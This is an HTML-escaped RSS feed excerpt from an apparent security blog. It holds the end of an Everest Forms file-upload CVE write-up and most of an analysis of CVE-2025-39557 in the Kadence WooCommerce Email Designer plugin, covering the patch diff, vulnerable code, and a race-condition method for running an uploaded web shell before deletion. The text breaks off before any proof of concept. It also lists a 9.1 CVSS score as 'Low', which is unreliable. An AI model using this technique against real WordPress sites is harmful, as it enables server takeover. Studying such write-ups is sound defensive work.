&lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Access the uploaded file.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/result.png&#34; title=&#34;phpinfo() from uploaded file&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;phpinfo() from uploaded file&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/result.png&#39; alt=&#34;Result&#34; height=&#34;1113&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;phpinfo() from uploaded file&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability in &lt;code&gt;EVF_Form_Fields_Upload::format()&lt;/code&gt; allows arbitrary file upload, read, and deletion due to improper file type and path validation. Although the plugin logs an error when encountering an invalid file, the execution flow does not halt and still calls &lt;code&gt;rename()&lt;/code&gt; to move the file into a public directory — enabling the placement of executable code on the server (RCE), disclosure of sensitive data, or site takeover. The patch (&amp;gt;= 3.0.9.5) fixes this by stopping execution when an invalid file is detected; unpatched sites remain at high risk.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Insufficient validation of file types/extensions can lead to executable file uploads.&lt;/li&gt;&#xA;&lt;li&gt;Detecting an invalid file but not stopping the execution flow allows attackers to bypass checks.&lt;/li&gt;&#xA;&lt;li&gt;Validation is meaningless unless accompanied by a blocking action (stop/exit/wp_die) prior to filesystem operations.&lt;/li&gt;&#xA;&lt;li&gt;Validate file content (MIME/content) in addition to name/extension provided by the client.&lt;/li&gt;&#xA;&lt;li&gt;Prevent PHP execution in the &lt;code&gt;uploads&lt;/code&gt; directory and use safe upload APIs (e.g., &lt;code&gt;wp_handle_upload()&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/everest-forms/vulnerability/wordpress-everest-forms-plugin-3-0-9-4-unauthenticated-arbitrary-file-upload-read-and-deletion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Everest Forms Plugin &amp;lt;= 3.0.9.4 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-39557 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-08-cve-2025-39557/</link>
      <pubDate>Sat, 08 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-08-cve-2025-39557/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-08-cve-2025-39557/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;An &lt;strong&gt;Arbitrary File Upload&lt;/strong&gt; vulnerability in &lt;strong&gt;Ben Ritner - Kadence WP Kadence WooCommerce Email Designer&lt;/strong&gt; allows &lt;strong&gt;uploading a web shell to the web server&lt;/strong&gt;. This issue affects &lt;strong&gt;Kadence WooCommerce Email Designer&lt;/strong&gt; from an &lt;strong&gt;unspecified version up to 1.5.14&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-39557&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-39557&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.5.14&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.5.15&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (9.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/kadence-woocommerce-email-designer/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Kadence WooCommerce Email Designer Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Kadence WooCommerce Email Designer&lt;/strong&gt;: &lt;strong&gt;1.5.14&lt;/strong&gt; (vulnerable) and &lt;strong&gt;1.5.15&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool to compare versions.&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WooCommerce Plugin&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;static private function import_woomail( $wp_customize ) {&#xA;  ...&#xA;  $overrides = array( &amp;#39;test_form&amp;#39; =&amp;gt; false, &amp;#39;test_type&amp;#39; =&amp;gt; false, &amp;#39;mimes&amp;#39; =&amp;gt; array( &amp;#39;dat&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39;, &amp;#39;json&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39; ) );&#xA;  $file = wp_handle_upload( $_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;], $overrides );&#xA;  ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the vulnerable version, the &lt;code&gt;import_woomail()&lt;/code&gt; function calls &lt;code&gt;wp_handle_upload()&lt;/code&gt; to upload files to WordPress&amp;rsquo;s uploads directory (&lt;code&gt;wp-content/uploads/&amp;lt;year&amp;gt;/&amp;lt;month&amp;gt;/&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;However, the option &lt;code&gt;test_type =&amp;gt; false&lt;/code&gt; causes WordPress to &lt;strong&gt;skip MIME type checking&lt;/strong&gt; against the whitelist.&#xA;This allows an attacker to &lt;strong&gt;upload dangerous files such as a &lt;code&gt;.php&lt;/code&gt; web shell&lt;/strong&gt; to the server.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;static private function import_woomail( $wp_customize ) {&#xA;  ...&#xA;  $overrides               = array( &amp;#39;test_form&amp;#39; =&amp;gt; false, &amp;#39;test_type&amp;#39; =&amp;gt; true, &amp;#39;mimes&amp;#39; =&amp;gt; array( &amp;#39;dat&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39;, &amp;#39;json&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39; ) );&#xA;  $file                    = wp_handle_upload( $_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;], $overrides );&#xA;  ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch changes &lt;code&gt;&#39;test_type&#39; =&amp;gt; true&lt;/code&gt;, enabling MIME checks against the whitelist and preventing dangerous uploads like &lt;code&gt;.php&lt;/code&gt; web shells.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;static private function import_woomail( $wp_customize ) {&#xA;  // Make sure we have a valid nonce.&#xA;  if ( ! wp_verify_nonce( $_REQUEST[&amp;#39;kt-woomail-import&amp;#39;], &amp;#39;kt-woomail-importing&amp;#39; ) ) {&#xA;    return;&#xA;  }&#xA;  // Make sure WordPress upload support is loaded.&#xA;  if ( ! function_exists( &amp;#39;wp_handle_upload&amp;#39; ) ) {&#xA;    require_once( ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39; );&#xA;  }&#xA;  // Load the export/import option class.&#xA;  require_once KT_WOOMAIL_PATH . &amp;#39;includes/class-kadence-woomail-import-option.php&amp;#39;;&#xA;  // Setup global vars.&#xA;  global $wp_customize;&#xA;  global $kt_woomail_import_error;&#xA;&#xA;  // Setup internal vars.&#xA;  $kt_woomail_import_error = false;&#xA;  $template                = &amp;#39;kadence-woomail-designer&amp;#39;;&#xA;  $overrides               = array( &amp;#39;test_form&amp;#39; =&amp;gt; false, &amp;#39;test_type&amp;#39; =&amp;gt; false, &amp;#39;mimes&amp;#39; =&amp;gt; array( &amp;#39;dat&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39;, &amp;#39;json&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39; ) );&#xA;  $file                    = wp_handle_upload( $_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;], $overrides );&#xA;&#xA;  // Make sure we have an uploaded file.&#xA;  if ( isset( $file[&amp;#39;error&amp;#39;] ) ) {&#xA;    $kt_woomail_import_error = $file[&amp;#39;error&amp;#39;];&#xA;    return;&#xA;  }&#xA;  if ( ! file_exists( $file[&amp;#39;file&amp;#39;] ) ) {&#xA;    $kt_woomail_import_error = __( &amp;#39;Error importing settings! Please try again.&amp;#39;, &amp;#39;kadence-woocommerce-email-designer&amp;#39; );&#xA;    return;&#xA;  }&#xA;  // Get the upload data.&#xA;  $raw  = file_get_contents( $file[&amp;#39;file&amp;#39;] );&#xA;  $data = json_decode( $raw, true );&#xA;  // Check for support of older export files. Will remove later.&#xA;  if ( ( &amp;#39;array&amp;#39; != gettype( $data ) || ! isset( $data[&amp;#39;template&amp;#39;] ) ) &amp;amp;&amp;amp; version_compare( phpversion(), &amp;#39;7.0.0&amp;#39; ) &amp;gt;= 0  ) {&#xA;    $data = @unserialize( base64_decode( $raw ), array( &amp;#39;allowed_classes&amp;#39; =&amp;gt; false ) );&#xA;    if ( &amp;#39;array&amp;#39; != gettype( $data ) || ! isset( $data[&amp;#39;template&amp;#39;] ) ) {&#xA;      $data = self::mb_unserialize( $raw );&#xA;    }&#xA;  }&#xA;  // Remove the uploaded file.&#xA;  unlink( $file[&amp;#39;file&amp;#39;] );&#xA;  ...&#xA;  exit;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;import_woomail()&lt;/code&gt; function handles uploads and imports for the Kadence WooCommerce Email Designer plugin:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Verify nonce to ensure request validity (prevent CSRF):&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_verify_nonce( $_REQUEST[&amp;#39;kt-woomail-import&amp;#39;], &amp;#39;kt-woomail-importing&amp;#39; ) ) {&#xA;&#x9;return;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Perform the upload via &lt;code&gt;wp_handle_upload()&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$overrides = array( &amp;#39;test_form&amp;#39; =&amp;gt; false, &amp;#39;test_type&amp;#39; =&amp;gt; false, &amp;#39;mimes&amp;#39; =&amp;gt; array( &amp;#39;dat&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39;, &amp;#39;json&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39; ) );&#xA;$file = wp_handle_upload( $_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;], $overrides );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As analyzed above, this implementation accepts &lt;code&gt;.php&lt;/code&gt; due to disabled MIME checks.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Read uploaded file content and attempt to parse as &lt;strong&gt;JSON&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$raw  = file_get_contents( $file[&amp;#39;file&amp;#39;] );&#xA;$data = json_decode( $raw, true );&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;If not valid JSON → attempt &lt;code&gt;base64_decode()&lt;/code&gt; then &lt;code&gt;unserialize()&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ( &amp;#39;array&amp;#39; != gettype( $data ) || ! isset( $data[&amp;#39;template&amp;#39;] ) ) &amp;amp;&amp;amp; version_compare( phpversion(), &amp;#39;7.0.0&amp;#39; ) &amp;gt;= 0  ) {&#xA;&#x9;$data = @unserialize( base64_decode( $raw ), array( &amp;#39;allowed_classes&amp;#39; =&amp;gt; false ) );&#xA;&#x9;if ( &amp;#39;array&amp;#39; != gettype( $data ) || ! isset( $data[&amp;#39;template&amp;#39;] ) ) {&#xA;&#x9;&#x9;$data = self::mb_unserialize( $raw );&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Delete the uploaded file from the server:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;unlink( $file[&amp;#39;file&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We need to pay attention to the following:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;graph LR;&#xA;A[Upload File] --&amp;gt; B[Read File &amp;amp; Decode JSON]&#xA;B --&amp;gt; C{IF JSON}&#xA;C --&amp;gt;|True| D[&amp;#34;unserialize()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;unlink()&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;p&gt;The file is removed immediately after upload, so it cannot be accessed normally. Leverage the time window between &lt;code&gt;Upload File&lt;/code&gt; and &lt;code&gt;unlink()&lt;/code&gt; to call the uploaded file within that period to execute a web shell. This uses a &lt;code&gt;File Upload&lt;/code&gt; + &lt;code&gt;Race Condition&lt;/code&gt; technique.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function import_export_requests( $wp_customize ) {&#xA;  // Check if user is allowed to change values.&#xA;  if ( ! Kadence_Woomail_Designer::is_admin() ) {&#xA;    exit;&#xA;  }&#xA;  if ( isset( $_REQUEST[&amp;#39;kt-woomail-export&amp;#39;] ) ) {&#xA;    self::export_woomail( $wp_customize );&#xA;  }&#xA;  if ( isset( $_REQUEST[&amp;#39;kt-woomail-import&amp;#39;] ) &amp;amp;&amp;amp; isset( $_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;] ) ) {&#xA;    self::import_woomail( $wp_customize );&#xA;  }&#xA;&#xA;  if ( isset( $_REQUEST[&amp;#39;kt-woomail-import-template&amp;#39;] ) ) {&#xA;    self::import_woomail_template( $wp_customize );&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;import_woomail()&lt;/code&gt; is called inside &lt;code&gt;import_export_requests()&lt;/code&gt; if the user is &lt;code&gt;admin&lt;/code&gt; and &lt;code&gt;kt-woomail-import&lt;/code&gt; is present in &lt;code&gt;$_REQUEST&lt;/code&gt; along with an uploaded file in &lt;code&gt;$_FILES[&#39;kadence-woomail-import-file&#39;]&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;import_export_requests&lt;/code&gt; method is registered as a callback for the action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;customize_register&amp;#39;, array( $this, &amp;#39;import_export_requests&amp;#39; ), 999999 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So when using the Customizer (&lt;code&gt;customize.php&lt;/code&gt;), &lt;code&gt;import_export_requests&lt;/code&gt; will be executed.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 